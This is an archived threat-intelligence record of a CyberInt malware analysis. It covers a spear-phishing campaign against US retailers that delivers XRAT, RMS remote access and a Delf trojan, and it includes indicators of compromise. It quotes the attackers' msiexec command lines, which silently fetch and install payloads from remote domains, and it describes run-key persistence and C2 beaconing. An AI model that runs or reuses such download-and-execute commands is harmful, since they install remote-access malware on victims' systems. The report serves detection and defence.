{
    "id": "af04c250-5361-46ad-89c4-4d163dcc45cd",
    "created_at": "2022-11-23T12:04:25.935992Z",
    "updated_at": "2025-03-27T02:15:38.029685Z",
    "deleted_at": null,
    "sha1_hash": "7c1c14618ac8ee57e3ca15c97954406ed50e31ca",
    "title": "CyberInt_Cyber Criminals Go After USA Retailers_Report",
    "authors": "",
    "file_creation_date": "2019-01-27T14:24:19Z",
    "file_modification_date": "2019-01-27T14:24:19Z",
    "file_size": 760631,
    "plain_text": "-----\n\n# Attack Summary\n\nIn mid-December we detected an email spear-phishing campaign targeting large USA retailers and other\norganizations in the food and beverage industry. This campaign delivers several malware families such as Gussdoor,\nXrat, and Vimditator among others.\n\nThe phishing document appears to come from a Ricoh printer and contains the targeted organization logo. The\nphishing document is a macro enabled document, which executes and downloads 2[nd] stage to the victim’s machine.\n\nFigure 1 - Phishing Document\n\n# Campaign Details\n\nDuring the campaign we observed the threat actor sends several phishing documents, one document (MD5:\n```\ne377557c8f35beeb050370c4479bcb04) see figure 1. Once executed, the macro executes the following\n\n```\ncommand connecting to hxxp:// local365office.com/content /q using the /q directive which\ntells msiexec to run in the background.\n```\nC:\\Windows\\System32\\msiexec.exe\" step=six done=false /i\nhttp://local365office.com/content /q change=false\n\n```\nmsiexec.exe downloads and loads an MSI binary (MD5:69f09ef629df82c8498328272b569160) figure 2\nshows the execution flow of the MSI binary.\n\n\n-----\n\nFigure 2 – MSI binary execution flow\n\nThe MSI installer drops another binary file to disk to the following directory\n```\nc:\\windows\\installer\\msi2adc.tmp (MD5: d7a3237eaeeda49aadb08e2d2b77544d) which\n\n```\nthen extracts the following files to the appdata\\local\\temp\\ directory :\n\n**File Name** **MD5** **Description**\n```\n exit.exe 1ef6de479454047ce01a8a0fb71b0167 XRAT\n syst.dll b724e46b6a356e7d5ae2f14b0ef14211 sfxrar archive\n i.cmd a09b1fae1a7f4daf463cafea31884641 Batch file launcher\n                                 and persistence\n                                 creation\n\n```\nOnce extracted exit.exe launches and spawns cmd.exe with the following command line parameters cmd.exe\"\n```\n/C i.cmd”. the content of i.cmd is shown in figure 3\n\n```\nFigure 3 - Embedded VBScript\n\nThe i.cmd executes a ping command with -n 3 indicating the number of echo requests to cloudflare.com\n```\nwith -w 3000 indicating a timeout time of 3000 milliseconds. The malware does that to check internet\n\n```\nconnectivity. If the ping requests succeed indicated by the IF %ERRORLEVEL% NEQ 1 which checks that the\ncommand was executed successfully with no error, it then changes the name of syst.dll file dropped previously\nand changes its name to 7zinstall.exe, it then runs another ping command to cloudfalre.com and if\nsuccessful, 7zinstall.exe is executed and self-extracts itself as indicated with x parameter using the -p and\nthe password of 3KPnoNJ3ReME4bEU5W9APkKS5ErkR3tNRT. 7zinstall.exe then extracts the following files\nto the following directory C:\\ProgramData\\Microtik:\n\n|File Name MD5 Description|Col2|Col3|\n|---|---|---|\n|exit.exe|1ef6de479454047ce01a8a0fb71b0167|XRAT|\n|syst.dll|b724e46b6a356e7d5ae2f14b0ef14211|sfxrar archive|\n|i.cmd|a09b1fae1a7f4daf463cafea31884641|Batch file launcher and persistence creation|\n\n\n-----\n\n|File Name MD5 Description|Col2|Col3|\n|---|---|---|\n|exit.exe|1ef6de479454047ce01a8a0fb71b0167|XRAT|\n|winserv.exe|cf2ab077a46219b6ce4a53517dd489ea|Legitimate signed RMS Remote Access Application|\n|i.cmd|cf96a6e7699ea815789970bf56b12c7d|Batch file launcher|\n|settings.dat|d5e2a280b9201e733cca19c6a6f94a61|RMS Config file|\n\n\nOnce the files are extracted, 7zinstall.exe executes exit.exe using ShellExecuteEX as shown in figure 4\n\nFigure 4 – 7zinstall.exe lunches exit.exe\n\nexit.exe then spawns cmd.exe with the following command line parameters cmd.exe /C i.cmd, the content\nof i.cmd is shown in figure 5.\n\nFigure 5 – i.cmd content\n\nWhen executed i.cmd sets a registry name called “Microtik” under\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the value of\nc:\\ProgramData\\Microtik\\winserv.exe which is the RMS remote access program and then launches\n\n```\nwinserve.exe. it then tries to forcefully kill rundell32.exe, which causes the script to go into a loop.\n\nOnce winserv.exe is executed it tries to connect to 89.144.25.32:5655 C2 server located in Germany which\nwas down at the time of the analysis.\n\nWhen pivoting on the domain local365office.com it is hosted on the IP Address 88.99.180.3 located in\nGermany. Checking the ISP IP information, it shows it belongs to ISP called Oleg Gorshkov. This ISP shares that\ninformation only with 139 other domains.\n\nOne of those domains is office365onlinehome.com which has a very similar naming convention to\n```\nlocal365office.com. when examining office365onlinehome.com it shows a malicious document\n\n```\n(MD5: a7194d55e60cbfa69a5b31d039182882) was communicating with that domain with a common lure\ntheme as shown in figure 6\n\n\n-----\n\nFigure 6 - phishing document\n\nLooking at the document it is clear to be related with the other phishing documents described above.\n\nFurther analysis of the malicious document shows similar TTP’s executing msiexec.exe with the following\ncommand line artifacts msiexec.exe next=back error=shutdown /i\n```\nhttp://office365onlinehome.com/host32 /q OnChange=\"c:\\windows\\system32\"\nAciqy=VIk¶µ±s1. It then connects to office365onlinehome.com over port 80 and downloads an msi\n\n```\ninstaller (MD5: f3014c7ac2848ca542e6ba16e20452f4) to the AppData\\Local\\Temp\\ directory,\nonce executed the msi installer drops the following filemsi2a01.tmp (MD5:\n```\nc4a201a6f5e07136923f824bda4cd54f) to the following directory C:\\Windows\\Installer\\ and\n\n```\nexecutes the file. This file was used in another reported campaign published by Proofpoint describing a threat\nactor they refer as TA505 delivering a new back door they call ServHelper[1]\n\nWhen executed it creates the following files in the AppData\\Local\\Temp\\ directory\n\n**File Name** **MD5** **Description**\n```\n helpobj.dat 1757fb9c9425a6ef5afab5992f4ff826 Malicious DLL\n sdw.vbs 34dfa089ba90dbb9cf722ee9ddc28c44 VB Script launcher\n zxa.bat 542f3e026e135ff0da7f6edb1e60e886 Batch file launcher\n\n```\nIt then launches wscript with the following command line arguments wscript\"\n```\n\"C:\\Users\\admin\\AppData\\Local\\Temp\\sdw.vbs, the content of the vbs file is shown in figure 7\n\n```\n|File Name MD5 Description|Col2|Col3|\n|---|---|---|\n|helpobj.dat|1757fb9c9425a6ef5afab5992f4ff826|Malicious DLL|\n|sdw.vbs|34dfa089ba90dbb9cf722ee9ddc28c44|VB Script launcher|\n|zxa.bat|542f3e026e135ff0da7f6edb1e60e886|Batch file launcher|\n\n\n-----\n\nFigure 7 - content of saw.vbs\n\nThe vbs script acts as a launcher and executes zxa.bat, the content of zxa.bat is shown in figure 8\n\nFigure 8 - zxa.bat content\n```\nzxa.bat act as launcher and executes helpobj.dat using rundll32.exe, helpobj.dat is a PECompact\n\n```\npacked DLL file commonly known as Win32.Trojan.Delf. this malware family is a generic trojan which is\nusually used to steal victims’ information. The file is signed with a legitimate code signing certificate, the digital\ncertificate is shown in figure 9\n\nFigure 9 - Code signing certificate details\n\nThe certificate name NEON CRAYON LIMITED, searching for NEON CRAYON LIMITED reveals a privately held\ncompany located at 189a Evering Road Flat 1, 189a Evering Road, London, England that deals in computer repair\nservices, the location of NEON CRAYON LIMITED is shown in figure 10.\n\n\n-----\n\nFigure 10 - Neon Crayon Limited registered office location\n\nThe fact that NEON CRAYON LIMITED is operated from a private residence may indicate that the company was\ncompromised at some point and got its code signing certificate stolen and used to sign helpobj.dat malware.\n\nWhen executed helpobj.dat beacons to hxxps://afgdhjkrm.pw/aggdst/Hasrt.php over port 443\nusing HTTP POST with User-Agent Embarcadero URI Client/1.0 which is identified with RAD\nstudio a C++/Delphi Compiler, and sends out the following information shown in figure 11.\n\nThe information sent to the server includes the host information such as Operating System version and a key\nidentifier.\n\n# Conclusion\n\nThis campaign shows yet again how attackers are improving their obfuscation capabilities to hide\n\ntheir attacks with multi layered executions in hope to evade detection.\n\nThis campaign also shows that leveraging commodity malware that packs a strong punch and\n\ndelivers sophisticated capabilities, is an intimidating weapon in the hands of a motivated\n\nadversary.\n\n\n-----\n\n# Indicators of Compromise (IOC)\n\n## Files\n```\n    o 1ef6de479454047ce01a8a0fb71b0167– XRAT\n    o cf2ab077a46219b6ce4a53517dd489ea– RMS Remote Access Application\n   o cf96a6e7699ea815789970bf56b12c7d - Batch file launcher\n    o d5e2a280b9201e733cca19c6a6f94a61 – RMS Remote Access Config File\n    o e377557c8f35beeb050370c4479bcb04 – Retail Phishing document\n    o a7194d55e60cbfa69a5b31d039182882 – Phishing document\n    o f3014c7ac2848ca542e6ba16e20452f4 – MSI Installer\n    o 1757fb9c9425a6ef5afab5992f4ff826 – Win32.Trojan.Delf\n    o 34dfa089ba90dbb9cf722ee9ddc28c44 – VBS Launcher\n    o c0440bd30ed33cfb7b0e29fbf0debe6f – batch file launcher\n    o 5E82C4287B08B94E205D43DF28A7ECF2 – Certificate Serial Number\n\n Domains\n    o local365office.com – C2\n    o office365onlinehome.com – C2\n    o afgdhjkrm.pw – C2\n\n URLs\n    o hxxp://local365office.com/content\n    o hxxp://office365onlinehome.com/host32\n    o hxxps://afgdhjkrm.pw/aggdst/Hasrt.php\n\n IP Address\n    o 89.144.25.32 : 5655\n    o 88.99.180.3\n    o 37.252.9.68\n\n User-Agent\n    o Embarcadero URI Client/1.0\n\n```\n\n-----\n\n|Col1|46-568-7813 9th Street, Suite 06A-104 | New York, NY, 10001 | USA|\n|---|---|\n|USA Tel: +1-6 214 W 2||\n|||\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf"
    ],
    "report_names": [
        "CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf"
    ],
    "threat_actors": [
        {
            "id": "88854a9f-641a-4412-89db-449b4d5cbc51",
            "created_at": "2022-10-25T16:07:23.963599Z",
            "updated_at": "2025-03-27T02:02:10.051548Z",
            "deleted_at": null,
            "main_name": "Operation HangOver",
            "aliases": [
                "Monsoon",
                "Operation HangOver",
                "Viceroy Tiger"
            ],
            "source_name": "ETDA:Operation HangOver",
            "tools": [
                "AutoIt backdoor",
                "BADNEWS",
                "BackConfig",
                "JakyllHyde",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1669205065,
    "ts_updated_at": 1743041738,
    "ts_creation_date": 1548599059,
    "ts_modification_date": 1548599059,
    "files": {
        "pdf": "https://archive.orkl.eu/7c1c14618ac8ee57e3ca15c97954406ed50e31ca.pdf",
        "text": "https://archive.orkl.eu/7c1c14618ac8ee57e3ca15c97954406ed50e31ca.txt",
        "img": "https://archive.orkl.eu/7c1c14618ac8ee57e3ca15c97954406ed50e31ca.jpg"
    }
}